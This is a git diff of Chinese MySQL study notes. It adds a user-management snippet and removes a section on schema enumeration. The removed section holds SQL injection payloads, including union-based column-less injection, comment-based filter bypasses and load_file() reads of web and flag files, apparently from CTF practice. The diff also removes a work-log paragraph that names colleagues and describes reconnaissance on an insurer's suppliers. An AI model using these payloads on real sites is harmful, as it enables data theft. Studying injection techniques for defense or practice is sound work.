@@ -268,6 +268,16 @@ mysql -u root -p
 mysql>
 ```
 
+用户管理
+
+```sql
+CREATE USER 'your_name' IDENTIFIED BY 'password';
+GRANT all privileges ON db_name.* TO your_name@localhost IDENTIFIED BY 'password';
+SHOW GRANTS FOR your_name;
+```
+
+
+
 ## Python Connector
 
 将SQL嵌入到高级语言中混合编程，SQL语句负责操纵数据库，高级语言负责控制逻辑，称为嵌入式SQL，重点在于两种语言之间的通信
@@ -308,88 +318,4 @@ cnx.close()
 # https://dev.mysql.com/doc/refman/8.4/en/group-by-modifiers.html
 SELECT * FROM students GROUP BY class_id WITH ROLLUP;
 ```
-
-## 获取数据库信息
-
-### 数据库名
-
-```sql
-# MySQL
-SELECT schema_name FROM information_schema.schemata;
-```
-
-### 表名
-
-参考：https://www.cnblogs.com/20175211lyz/p/12358725.html
-
-```sql
-# MySQL
-SELECT table_name FROM information_schema.tables WHERE table_schema = 'db_name';
-# MySQL 5.6+
-SELECT table_name from mysql.innodb_table_stats WHERE database_name = database();
-# MySQL 5.7.9+
-# 包含in
-SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();
-SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
-SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
-SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();
-# 不包含in
-SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();
-SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();
-SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
-# 通过表文件的存储路径获取表名
-SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
-SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
-SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
-
-# performance schema
-SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();
-SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();
-
-```
-
-### 列名
-
-```sql
-# mysql
-SELECT column_name FROM information_schema.columns
-WHERE table_name="table" AND table_schema="db_name";
-```
-
-特殊：无列名注入
-
-```sql
-SELECT a FROM (select 1 `a`, 2 `b` union select * from `test_table`)x;
-
-# 无逗号、使用join的版本
-SELECT a FROM (
-    (select * from (select 1 `a`)p join (select 2 `b`)q where 0)x
-    union
-    select * from test_table
-)x;
-```
-
-
-
-```sql
-SELECT`table_name`from(mysql.innodb_table_stats)WHERE`database_name`=database()
-SELECT ? FROM content WHERE id=
-'0'union(select`c`from(select'1'`a`,'2'`b`,'3'`c`union(select*from`content`))t/**/limit/**/1,1)
-
-'0'union(select/**/load_file("../../../var/www/html/secret.php"))
-'0'union(select/**/load_file("/real_flag_is_here"))
-
-union(select`a`from(select'1'`a`,'2'`b`)r)
-```
-
-
-
-
-
-我这周跟着李佳俊排查了航保供应商的资产，也在继续搜集航保的信息，空闲时间在学php以及在靶场练习
-
-供应商资产排查了一遍没有发现直接和航保相关的；有一些不知道有没有关联的，像是用途不明的api，李佳俊让我不用看这些。航保的敏感信息搜集我去找了他们的官网和公众号，泄露很少，只有几个hr和咨询邮箱。我和罗超他们讨论过，现在我们几个人搜集到的差不多都是这些东西
 
